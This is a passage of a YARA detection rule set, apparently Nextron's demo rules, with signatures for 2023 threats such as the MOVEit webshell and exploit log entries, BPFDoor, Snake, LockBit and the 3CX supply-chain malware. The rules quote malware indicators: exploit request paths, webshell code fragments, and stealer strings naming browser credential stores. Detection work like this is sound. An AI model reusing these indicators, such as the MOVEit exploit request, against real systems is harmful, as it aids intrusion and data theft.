\"https://www.rapid7.com/blog/post/2023/06/01/rapid7-observed-exploitation-of-critical-moveit-transfer-vulnerability/\"\n      date = \"2023-06-01 12:19:31\"\n      score = 85\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"2413b5d0750c23b07999ec33a5b4930be224b661aaf290a0118db803f31acbc5\"\n      hash2 = \"48367d94ccb4411f15d7ef9c455c92125f3ad812f2363c4d2e949ce1b615429a\"\n      hash3 = \"e8012a15b6f6b404a33f293205b602ece486d01337b8b3ec331cd99ccadb562e\"\n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"X-siLock-Comment\" ascii fullword\n      $s2 = \"]; string x = null;\" ascii\n      $s3 = \";  if (!String.Equals(pass, \" ascii\n   condition: \n      filesize < 150KB and 2 of them\n}\n\nrule LOG_EXPL_MOVEit_Exploitation_Indicator_Jun23_1_RID37DA : DEMO EXPLOIT LOG {\n   meta:\n      description = \"Detects a potential compromise indicator found in MOVEit Transfer logs\"\n      author = \"Florian Roth\"\n      reference = \"https://www.huntress.com/blog/moveit-transfer-critical-vulnerability-rapid-response\"\n      date = \"2023-06-01 17:56:11\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXPLOIT, LOG\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"POST /moveitisapi/moveitisapi.dll action=m2 \" ascii\n      $x2 = \" GET /human2.aspx - 443 \" ascii\n   condition: \n      1 of them\n}\n\nrule SUSP_HxD_Icon_Anomaly_May23_1_RID3152 : ANOMALY DEMO EXE FILE SUSP {\n   meta:\n      description = \"Detects suspicious use of the free hex editor HxD's icon in PE files that don't seem to be a legitimate version of HxD\"\n      author = \"Florian Roth\"\n      reference = \"https://www.linkedin.com/feed/update/urn:li:activity:7068631930040188929/?utm_source=share&utm_medium=member_ios\"\n      date = \"2023-05-29 13:17:31\"\n      score = 65\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"ANOMALY, DEMO, EXE, FILE, SUSP\"\n      required_modules = \"pe\"\n      minimum_yara = \"3.5.0\"\n      \n   strings:\n      $ac1 = { 99 00 77 0D DD 09 99 80 99 00 77 0D DD 09 99 80\n               99 00 77 0D DD 09 99 80 99 00 77 0D DD 09 99 80\n               99 00 77 0D DD 09 99 80 99 00 77 0D DD 09 99 80\n               99 00 77 0D DD 09 99 80 99 00 77 0D DD 09 99 80\n               99 00 77 0D DD 09 99 80 99 00 77 0D D0 99 98 09\n               99 99 00 0D D0 99 98 09 99 99 00 0D D0 99 98 09\n               99 99 00 0D D0 99 98 0F F9 99 00 0D D0 99 98 09\n               9F 99 00 0D D0 99 98 09 FF 99 00 0D D0 99 98 09\n               FF 99 00 0D D0 99 98 09 99 99 00 0D D0 99 98 0F\n               F9 99 00 0D D0 99 98 09 99 99 00 0D 09 99 80 9F\n               F9 99 99 00 09 99 80 99 F9 99 99 00 09 99 80 FF } \n      $ac2 = { FF FF FF FF FF FF FF FF FF FF FF FF FF FF B9 DE\n               FA 68 B8 F4 39 A2 F1 39 A2 F1 39 A2 F1 39 A2 F1\n               39 A2 F1 39 A2 F1 68 B8 F4 B9 DE FA FF FF FF FF\n               FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF } \n      $s1 = { 00 4D 00 61 00 EB 00 6C 00 20 00 48 00 F6 00 72 00 7A } \n      $s2 = \"mh-nexus.de\" ascii wide\n      $upx1 = \"UPX0\" ascii fullword\n      $xs1 = \"terminator\" ascii wide fullword\n      $xs2 = \"Terminator\" ascii wide fullword\n   condition: \n      uint16 ( 0 ) == 0x5a4d and 1 of ( $ac* ) and ( not 1 of ( $s* ) or filesize > 6930000 or ( pe.is_32bit ( ) and filesize < 1540000 and not $upx1 ) or ( pe.is_32bit ( ) and filesize < 590000 and $upx1 ) or ( pe.is_64bit ( ) and filesize < 6670000 and not $upx1 ) or ( pe.is_64bit ( ) and filesize < 1300000 and $upx1 ) or 1 of ( $xs* ) )\n}\n\nrule MAL_LNX_RedMenshen_BPFDoor_May23_1_RID32CA : DEMO FILE LINUX MAL {\n   meta:\n      description = \"Detects BPFDoor malware\"\n      author = \"Florian Roth\"\n      reference = \"https://www.deepinstinct.com/blog/bpfdoor-malware-evolves-stealthy-sniffing-backdoor-ups-its-game\"\n      date = \"2023-05-11 14:20:11\"\n      score = 80\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"afa8a32ec29a31f152ba20a30eb483520fe50f2dce6c9aa9135d88f7c9c511d7\"\n      tags = \"DEMO, FILE, LINUX, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"[-] Execute command failed\" ascii fullword\n      $x2 = \"/var/run/initd.lock\" ascii fullword\n      $xc1 = { 2F 00 3E 3E 00 65 78 69 74 00 72 00 } \n      $sc1 = { 9F CD 30 44 } \n      $sc2 = { 66 27 14 5E } \n      $sa1 = \"TLS-CHACHA20-POLY1305-SHA256\" ascii fullword\n      $sop1 = { 48 83 c0 01 4c 39 f8 75 ea 4c 89 7c 24 68 48 69 c3 d0 00 00 00 48 8b 5c 24 50 48 8b 54 24 78 48 c7 44 24 38 00 00 00 00 } \n      $sop2 = { 48 89 de f3 a5 89 03 8b 44 24 2c 39 44 24 28 44 89 4b 04 48 89 53 10 0f 95 c0 } \n      $sop3 = { 49 d3 cd 4d 31 cd b1 29 49 89 e9 49 d3 c8 4d 31 c5 4c 03 68 10 48 89 f9 } \n   condition: \n      uint16 ( 0 ) == 0x457f and filesize < 900KB and ( ( 1 of ( $x* ) and 1 of ( $s* ) ) or 4 of them or ( all of ( $sc* ) and $sc1 in ( @sc2 [ 1 ] - 50 .. @sc2 [ 1 ] + 50 ) ) ) or ( 2 of ( $x* ) or 5 of them )\n}\n\nrule APT_MAL_RU_Snake_Indicators_May23_1_RID3370 : APT DEMO G0010 MAL RUSSIA {\n   meta:\n      description = \"Detects indicators found in Snake malware samples\"\n      author = \"Florian Roth\"\n      reference = \"https://media.defense.gov/2023/May/09/2003218554/-1/-1/0/JOINT_CSA_HUNTING_RU_INTEL_SNAKE_MALWARE_20230509.PDF\"\n      date = \"2023-05-10 14:47:51\"\n      score = 85\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"10b854d66240d9ee1ce4296d2f7857d2b1c6f062ca836d13d777930d678b3ca6\"\n      hash2 = \"15ac5a61fb3e751045de2d7f5ff26c673f3883e326cd1b3a63889984a4fb2a8f\"\n      hash3 = \"315ec991709eb45eccf724dfe31bccb7affcac7f8e8007e688ba8d02827205e0\"\n      tags = \"APT, DEMO, G0010, MAL, RUSSIA\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"\\\\\\\\.\\\\%s\\\\\\\\\" ascii fullword\n      $s2 = \"read_peer_nfo\" ascii fullword\n      $s3 = \"rcv_buf=%d%c\" ascii fullword\n      $s4 = \"%s: (0x%08x)\" ascii fullword\n      $s5 = \"no_impersonate\" ascii fullword\n   condition: \n      all of them\n}\n\nrule SUSP_VULN_DRV_PROCEXP152_May23_RID304E : DEMO EXE FILE SUSP {\n   meta:\n      description = \"Detects vulnerable process explorer driver (original file name: PROCEXP152.SYS), often used by attackers to elevate privileges (false positives are possible in cases in which old versions of process explorer are still present on the system)\"\n      author = \"Florian Roth\"\n      reference = \"https://news.sophos.com/en-us/2023/04/19/aukill-edr-killer-malware-abuses-process-explorer-driver/\"\n      date = \"2023-05-05 12:34:11\"\n      score = 50\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2023-07-28\"\n      hash1 = \"cdfbe62ef515546f1728189260d0bdf77167063b6dbb77f1db6ed8b61145a2bc\"\n      tags = \"DEMO, EXE, FILE, SUSP\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $a1 = \"\\\\ProcExpDriver.pdb\" ascii\n      $a2 = \"\\\\Device\\\\PROCEXP152\" wide fullword\n      $a3 = \"procexp.Sys\" wide fullword\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 200KB and all of them\n}\n\nrule APT_MAL_VEILEDSIGNAL_Backdoor_Apr23_2_RID3301 : APT DEMO MAL {\n   meta:\n      description = \"Detects malicious VEILEDSIGNAL backdoor\"\n      author = \"X__Junior\"\n      reference = \"https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/xtrader-3cx-supply-chain\"\n      date = \"2023-04-29 14:29:21\"\n      score = 80\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"APT, DEMO, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $sa1 = \"\\\\.\\\\pipe\\\\gecko.nativeMessaging\" ascii\n      $sa2 = \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Edg/95.0.1020.40\" ascii\n      $sa3 = \"application/json, text/javascript, */*; q=0.01\" ascii\n      $op1 = { 89 7? 24 ?? 44 8B CD 4C 8B C? 48 89 44 24 ?? 33 D2 33 C9 FF 15} \n      $op2 = { 4C 8B CB 4C 89 74 24 ?? 4C 8D 05 ?? ?? ?? ?? 44 89 74 24 ?? 33 D2 33 C9 FF 15} \n      $op3 = { 48 89 74 24 ?? 45 33 C0 89 74 24 ?? 41 B9 ?? ?? ?? ?? 89 74 24 ?? 48 8B D8 48 C7 00 ?? ?? ?? ?? 48 8B 0F 41 8D 50 ?? 48 89 44 24 ?? 89 74 24 ?? FF 15} \n   condition: \n      all of ( $op* ) or all of ( $sa* )\n}\n\nrule APT_MAL_VEILEDSIGNAL_Backdoor_Apr23_3_RID3302 : APT DEMO MAL {\n   meta:\n      description = \"Detects malicious VEILEDSIGNAL backdoor\"\n      author = \"X__Junior\"\n      reference = \"https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/xtrader-3cx-supply-chain\"\n      date = \"2023-04-29 14:29:31\"\n      score = 80\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"APT, DEMO, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $op1 = { 4C 8B CB 4C 89 74 24 ?? 4C 8D 05 ?? ?? ?? ?? 44 89 74 24 ?? 33 D2 33 C9 FF 15} \n      $op2 = { 89 7? 24 ?? 44 8B CD 4C 8B C? 48 89 44 24 ?? 33 D2 33 C9 FF 15} \n      $op3 = { 8B 54 24 ?? 4C 8D 4C 24 ?? 45 8D 46 ?? 44 89 74 24 ?? 48 8B CB FF 15} \n      $op4 = { 48 8D 44 24 ?? 45 33 C9 41 B8 01 00 00 40 48 89 44 24 ?? 41 8B D5 48 8B CF FF 15} \n   condition: \n      all of them\n}\n\nrule APT_MAL_VEILEDSIGNAL_Backdoor_Apr23_4_RID3303 : APT DEMO MAL {\n   meta:\n      description = \"Detects malicious VEILEDSIGNAL backdoor\"\n      author = \"X__Junior\"\n      reference = \"https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/xtrader-3cx-supply-chain\"\n      date = \"2023-04-29 14:29:41\"\n      score = 80\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"APT, DEMO, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $op1 = { 48 8D 15 ?? ?? ?? ?? 48 8D 4C 24 ?? E8 ?? ?? ?? ?? 85 C0 74 ?? 48 8D 15 ?? ?? ?? ?? 48 8D 4C 24 ?? E8 ?? ?? ?? ?? 85 C0 74 ?? 48 8D 15 ?? ?? ?? ?? 48 8D 4C 24 ?? E8 ?? ?? ?? ?? 85 C0 } \n      $op2 = { 48 8B C8 48 8D 15 ?? ?? ?? ?? FF 15 ?? ?? ?? ?? 45 33 C0 4C 8D 4D ?? B2 01 41 8D 48 ?? FF D0} \n      $op3 = { 33 FF C7 44 24 ?? 38 02 00 00 33 D2 8D 4F ?? FF 15 ?? ?? ?? ?? 48 8B D8 48 83 F8 FF 74 ?? 48 8D 54 24 ?? 48 8B C8 FF 15 } \n      $op4 = { 4C 8D 05 ?? ?? ?? ?? 48 89 4C 24 ?? 4C 8B C8 33 D2 89 4C 24 ?? FF 15 } \n   condition: \n      all of them\n}\n\nrule APT_MAL_VEILEDSIGNAL_Backdoor_Apr23_RID3270 : APT DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects malicious VEILEDSIGNAL backdoor\"\n      author = \"X__Junior\"\n      reference = \"https://www.mandiant.com/resources/blog/3cx-software-supply-chain-compromise\"\n      date = \"2023-04-20 14:05:11\"\n      score = 85\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"aa318070ad1bf90ed459ac34dc5254acc178baff3202d2ea7f49aaf5a055dd43\"\n      tags = \"APT, DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $op1 = {B8 AB AA AA AA F7 E1 8B C1 C1 EA 02 8D 14 52 03 D2 2B C2 8A 84 05 ?? ?? ?? ?? 30 84 0D ?? ?? ?? ??} \n      $op2 = { 50 66 0F 13 85 ?? ?? ?? ?? 66 0F 13 85 ?? ?? ?? ?? 66 0F 13 85 ?? ?? ?? ?? 66 0F 13 85 ?? ?? ?? ?? C7 85 ?? ?? ?? ?? 3C 00 00 00 C7 85 ?? ?? ?? ?? 40 00 00 00 C7 85 ?? ?? ?? ?? 05 00 00 00 FF 15} \n      $op3 = { 6A 00 8D 85 ?? ?? ?? ?? 50 6A 04 8D 85 ?? ?? ?? ?? 50 57 FF 15 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and all of them\n}\n\nrule SUSP_APT_MAL_VEILEDSIGNAL_Backdoor_Apr23_RID341A : APT DEMO MAL SUSP {\n   meta:\n      description = \"Detects marker found in VEILEDSIGNAL backdoor\"\n      author = \"X__Junior\"\n      reference = \"https://www.mandiant.com/resources/blog/3cx-software-supply-chain-compromise\"\n      date = \"2023-04-20 15:16:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2023-04-21\"\n      hash1 = \"aa318070ad1bf90ed459ac34dc5254acc178baff3202d2ea7f49aaf5a055dd43\"\n      tags = \"APT, DEMO, MAL, SUSP\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $opb1 = { 81 BD ?? ?? ?? ?? 5E DA F3 76} \n      $opb2 = { C7 85 ?? ?? ?? ?? 74 F2 39 DA 66 C7 85 ?? ?? ?? ?? E5 CF} \n      $opb3 = { C7 85 ?? ?? ?? ?? 74 F2 39 DA B9 00 04 00 00 66 C7 85 ?? ?? ?? ?? E5 CF } \n   condition: \n      2 of them\n}\n\nrule APT_NK_TradingTech_ForensicArtifacts_Apr23_1_RID374A : APT DEMO FILE NK {\n   meta:\n      description = \"Detects forensic artifacts, file names and keywords related the Trading Technologies compromise UNC4736\"\n      author = \"Florian Roth\"\n      reference = \"https://www.mandiant.com/resources/blog/3cx-software-supply-chain-compromise\"\n      date = \"2023-04-20 17:32:11\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2023-04-21\"\n      tags = \"APT, DEMO, FILE, NK\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"www.tradingtechnologies.com/trading/order-management\" ascii wide\n      $xf1 = \"X_TRADER_r7.17.90p608.exe\" ascii wide\n      $xf2 = \"\\\\X_TRADER-ja.mst\" ascii wide\n      $xf3 = \"C:\\\\Programdata\\\\TPM\\\\TpmVscMgrSvr.exe\" ascii wide\n      $xf4 = \"C:\\\\Programdata\\\\TPM\\\\winscard.dll\" ascii wide\n      $fp1 = \"<html\" \n   condition: \n      not uint16 ( 0 ) == 0x5025 and 1 of ( $x* ) and not 1 of ( $fp* )\n}\n\nrule SUSP_TH_APT_UNC4736_TradingTech_Cert_Apr23_1_RID35C4 : APT DEMO SUSP {\n   meta:\n      description = \"Threat hunting rule that detects samples signed with the compromised Trading Technologies certificate after May 2022\"\n      author = \"Florian Roth\"\n      reference = \"https://www.mandiant.com/resources/blog/3cx-software-supply-chain-compromise\"\n      date = \"2023-04-20 16:27:11\"\n      score = 65\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"APT, DEMO, SUSP\"\n      required_modules = \"pe\"\n      minimum_yara = \"3.0.0\"\n      \n   strings:\n      $s1 = { 00 85 38 A6 C5 01 8F 50 FC } \n      $s2 = \"Go Daddy Secure Certificate Authority - G2\" \n      $s3 = \"Trading Technologies International, Inc\" \n   condition: \n      pe.timestamp > 1651363200 and all of them\n}\n\nrule MAL_RANSOM_LockBit_Locker_LOG_Apr23_1_RID3398 : CRIME DEMO LOG MAL RANSOM {\n   meta:\n      description = \"Detects indicators found in LockBit ransomware log files\"\n      author = \"Florian Roth\"\n      reference = \"https://objective-see.org/blog/blog_0x75.html\"\n      date = \"2023-04-17 14:54:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CRIME, DEMO, LOG, MAL, RANSOM\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \" is encrypted. Checksum after encryption \" \n      $s2 = \"~~~~~Hardware~~~~\" \n      $s3 = \"[+] Add directory to encrypt:\" \n      $s4 = \"][+] Launch parameters: \" \n   condition: \n      2 of them\n}\n\nrule MAL_RANSOM_LNX_macOS_LockBit_Apr23_1_RID331B : CRIME DEMO LINUX MACOS MAL RANSOM {\n   meta:\n      description = \"Detects LockBit ransomware samples for Linux and macOS\"\n      author = \"Florian Roth\"\n      reference = \"https://twitter.com/malwrhunterteam/status/1647384505550876675?s=20\"\n      date = \"2023-04-15 14:33:41\"\n      score = 85\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"0a2bffa0a30ec609d80591eef1d0994d8b37ab1f6a6bad7260d9d435067fb48e\"\n      hash2 = \"9ebcbaf3c9e2bbce6b2331238ab584f95f7ced326ca4aba2ddcc8aa8ee964f66\"\n      hash3 = \"a405d034c01a357a89c9988ffe8a46a165915df18fd297469b2bcaaf97578442\"\n      tags = \"CRIME, DEMO, LINUX, MACOS, MAL, RANSOM\"\n      minimum_yara = \"3.2.0\"\n      \n   strings:\n      $x1 = \"restore-my-files.txt\" ascii fullword\n      $s1 = \"ntuser.dat.log\" ascii fullword\n      $s2 = \"bootsect.bak\" ascii fullword\n      $s3 = \"autorun.inf\" ascii fullword\n      $s4 = \"lockbit\" ascii fullword\n      $xc1 = { 33 38 36 00 63 6D 64 00 61 6E 69 00 61 64 76 00 6D 73 69 00 6D 73 70 00 63 6F 6D 00 6E 6C 73 } \n      $xc2 = { 6E 74 6C 64 72 00 6E 74 75 73 65 72 2E 64 61 74 2E 6C 6F 67 00 62 6F 6F 74 73 65 63 74 2E 62 61 6B } \n      $xc3 = { 76 6D 2E 73 74 61 74 73 2E 76 6D 2E 76 5F 66 72 65 65 5F 63 6F 75 6E 74 00 61 2B 00 2F 2A } \n      $op1 = { 84 e5 f0 00 f0 e7 10 40 2d e9 2e 10 a0 e3 00 40 a0 e1 ?? fe ff } \n      $op2 = { 00 90 a0 e3 40 20 58 e2 3f 80 08 e2 3f 30 c2 e3 09 20 98 e1 08 20 9d } \n      $op3 = { 2d e9 01 70 43 e2 07 00 13 e1 01 60 a0 e1 08 d0 4d e2 02 40 } \n   condition: \n      ( uint32be ( 0 ) == 0x7f454c46 or uint16 ( 0 ) == 0xfeca or uint16 ( 0 ) == 0xfacf or uint32 ( 0 ) == 0xbebafeca ) and ( 1 of ( $x* ) or 3 of them ) or 2 of ( $x* ) or 5 of them\n}\n\nrule MAL_JS_EFile_Apr23_1_RID2D82 : DEMO MAL {\n   meta:\n      description = \"Detects JavaScript malware used in eFile compromise\"\n      author = \"Florian Roth\"\n      reference = \"https://twitter.com/Ax_Sharma/status/1643178696084271104/photo/1\"\n      date = \"2023-04-06 10:34:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"let payload_chrome = \" \n      $s2 = \"else if (agent.indexOf(\\\"firefox\" \n   condition: \n      all of them\n}\n\nrule MAL_PHP_EFile_Apr23_1_RID2DCD : DEMO MAL {\n   meta:\n      description = \"Detects malware \"\n      author = \"Florian Roth\"\n      reference = \"https://twitter.com/malwrhunterteam/status/1642988428080865281?s=12&t=C0_T_re0wRP_NfKa27Xw9w\"\n      date = \"2023-04-06 10:47:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"mt_rand( 0, 0xffff ), mt_rand( 0, 0xffff )\" ascii\n      $s2 = \"C:\\\\\\\\ProgramData\\\\\\\\Browsers\" ascii fullword\n      $s3 = \"curl_https($api_url.\" ascii\n   condition: \n      all of them\n}\n\nrule MAL_Shellcode_Loader_Apr23_RID307A : DEMO MAL {\n   meta:\n      description = \"Detects shellcode loader as seen being used by Gopuram backdoor\"\n      author = \"X__Junior (Nextron Systems)\"\n      reference = \"https://securelist.com/gopuram-backdoor-deployed-through-3cx-supply-chain-attack/109344/\"\n      date = \"2023-04-03 12:41:31\"\n      score = 80\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"6ce5b6b4cdd6290d396465a1624d489c7afd2259a4d69b73c6b0ba0e5ad4e4ad\"\n      hash2 = \"b56279136d816a11cf4db9fc1b249da04b3fa3aef4ba709b20cdfbe572394812\"\n      tags = \"DEMO, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $op1 = { 41 C1 CB 0D 0F BE 03 48 FF C3 44 03 D8 80 7B ?? 00 75 ?? 41 8D 04 13 3B C6 74 } \n      $op2 = { B9 49 F7 02 78 4C 8B E8 E8 ?? ?? ?? ?? B9 58 A4 53 E5 48 89 44 24 ?? E8 ?? ?? ?? ?? B9 10 E1 8A C3 48 8B F0 E8 ?? ?? ?? ?? B9 AF B1 5C 94 48 89 44 24 ?? E8 } \n   condition: \n      all of them\n}\n\nrule APT_NK_MAL_DLL_Apr23_1_RID2DD9 : APT DEMO EXE FILE G0032 MAL NK {\n   meta:\n      description = \"Detects DLLs loaded by shellcode loader (6ce5b6b4cdd6290d396465a1624d489c7afd2259a4d69b73c6b0ba0e5ad4e4ad) (relation to Lazarus group)\"\n      author = \"Florian Roth (Nextron Systems)\"\n      reference = \"https://securelist.com/gopuram-backdoor-deployed-through-3cx-supply-chain-attack/109344/\"\n      date = \"2023-04-03 10:49:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"69dd140f45c3fa3aaa64c69f860cd3c74379dec37c46319d7805a29b637d4dbf\"\n      hash3 = \"bb1066c1ca53139dc5a2c1743339f4e6360d6fe4f2f3261d24fc28a12f3e2ab9\"\n      tags = \"APT, DEMO, EXE, FILE, G0032, MAL, NK\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"vG2eZ1KOeGd2n5fr\" ascii fullword\n      $s1 = \"Windows %d(%d)-%s\" ascii fullword\n      $s2 = \"auth_timestamp: \" ascii fullword\n      $s3 = \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36\" wide fullword\n      $op1 = { b8 c8 00 00 00 83 fb 01 44 0f 47 e8 41 8b c5 48 8b b4 24 e0 18 00 00 4c 8b a4 24 e8 18 00 00 48 8b 8d a0 17 00 00 48 33 cc } \n      $op2 = { 33 d2 46 8d 04 b5 00 00 00 00 66 0f 1f 44 00 00 49 63 c0 41 ff c0 8b 4c 84 70 31 4c 94 40 48 ff c2 } \n      $op3 = { 89 5c 24 50 0f 57 c0 c7 44 24 4c 04 00 00 00 c7 44 24 48 40 00 00 00 0f 11 44 24 60 0f 11 44 24 70 0f 11 45 80 0f 11 45 90 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 500KB and ( 1 of ( $x* ) or 2 of them ) or ( $x1 and 1 of ( $s* ) or 3 of them )\n}\n\nrule APT_MAL_NK_3CX_ICONIC_Stealer_Mar23_1_RID330B : APT DEMO EXE MAL NK {\n   meta:\n      description = \"Detects ICONIC stealer payload used in the 3CX incident\"\n      author = \"Florian Roth (Nextron Systems)\"\n      reference = \"https://github.com/volexity/threat-intel/blob/main/2023/2023-03-30%203CX/attachments/iconicstealer.7z\"\n      date = \"2023-03-31 14:31:01\"\n      score = 80\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"8ab3a5eaaf8c296080fadf56b265194681d7da5da7c02562953a4cb60e147423\"\n      tags = \"APT, DEMO, EXE, MAL, NK\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"{\\\"HostName\\\": \\\"%s\\\", \\\"DomainName\\\": \\\"%s\\\", \\\"OsVersion\\\": \\\"%d.%d.%d\\\"}\" wide fullword\n      $s2 = \"******************************** %s ******************************\" wide fullword\n      $s3 = \"AppData\\\\Local\\\\BraveSoftware\\\\Brave-Browser\\\\User Data\" wide fullword\n      $s4 = \"AppData\\\\Roaming\\\\Mozilla\\\\Firefox\\\\Profiles\" wide fullword\n      $s5 = \"SELECT url, title FROM urls ORDER BY id DESC LIMIT 500\" wide fullword\n      $s6 = \"TEXT value in %s.%s\" ascii fullword\n      $op1 = { 48 63 d1 48 63 ce 49 03 d1 49 03 cd 4c 63 c7 e8 87 1f 09 00 8b 45 d0 44 8d 04 37 } \n      $op2 = { 48 8b c8 8b 56 f0 48 89 46 d8 e8 78 8f f8 ff e9 ec 13 00 00 c7 46 20 ff ff ff ff e9 e0 13 00 00 33 ff } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 4000KB and 4 of them or 6 of them\n}\n\nrule APT_MAL_NK_3CX_macOS_Elextron_App_Mar23_1_RID352A : APT DEMO FILE MACOS MAL NK {\n   meta:\n      description = \"Detects macOS malware used in the 3CX incident\"\n      author = \"Florian Roth (Nextron Systems)\"\n      reference = \"Internal Research\"\n      date = \"2023-03-31 16:01:31\"\n      score = 80\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"51079c7e549cbad25429ff98b6d6ca02dc9234e466dd9b75a5e05b9d7b95af72\"\n      hash2 = \"f7ba7f9bf608128894196cf7314f68b78d2a6df10718c8e0cd64dbe3b86bc730\"\n      tags = \"APT, DEMO, FILE, MACOS, MAL, NK\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $a1 = \"com.apple.security.cs.allow-unsigned-executable-memory\" ascii\n      $a2 = \"com.electron.3cx-desktop-app\" ascii fullword\n      $s1 = \"s8T/RXMlALbXfowom9qk15FgtdI=\" ascii\n      $s2 = \"o8NQKPJE6voVZUIGtXihq7lp0cY=\" ascii\n   condition: \n      uint16 ( 0 ) == 0xfacf and filesize < 400KB and ( all of ( $a* ) and 1 of ( $s* ) )\n}\n\nrule APT_MAL_macOS_NK_3CX_Malicious_Samples_Mar23_1_RID3733 : APT DEMO FILE MACOS MAL NK {\n   meta:\n      description = \"Detects malicious macOS application related to 3CX compromise (decrypted payload)\"\n      author = \"Florian Roth (Nextron Systems)\"\n      reference = \"https://www.reddit.com/r/crowdstrike/comments/125r3uu/20230329_situational_awareness_crowdstrike/\"\n      date = \"2023-03-30 17:28:21\"\n      score = 80\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"b86c695822013483fa4e2dfdf712c5ee777d7b99cbad8c2fa2274b133481eadb\"\n      hash2 = \"ac99602999bf9823f221372378f95baa4fc68929bac3a10e8d9a107ec8074eca\"\n      hash3 = \"51079c7e549cbad25429ff98b6d6ca02dc9234e466dd9b75a5e05b9d7b95af72\"\n      tags = \"APT, DEMO, FILE, MACOS, MAL, NK\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"20230313064152Z0\" \n      $s2 = \"Developer ID Application: 3CX (33CF4654HL)\" \n   condition: \n      ( uint16 ( 0 ) == 0xfeca or uint16 ( 0 ) == 0xfacf or uint32 ( 0 ) == 0xbebafeca ) and all of them\n}\n\nrule APT_MAL_MacOS_NK_3CX_DYLIB_Mar23_1_RID31AD : APT DEMO MACOS MAL NK {\n   meta:\n      description = \"Detects malicious DYLIB files related to 3CX compromise\"\n      author = \"Florian Roth (Nextron Systems)\"\n      reference = \"https://www.sentinelone.com/blog/smoothoperator-ongoing-campaign-trojanizes-3cx-software-in-software-supply-chain-attack/\"\n      date = \"2023-03-30 13:32:41\"\n      score = 80\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = 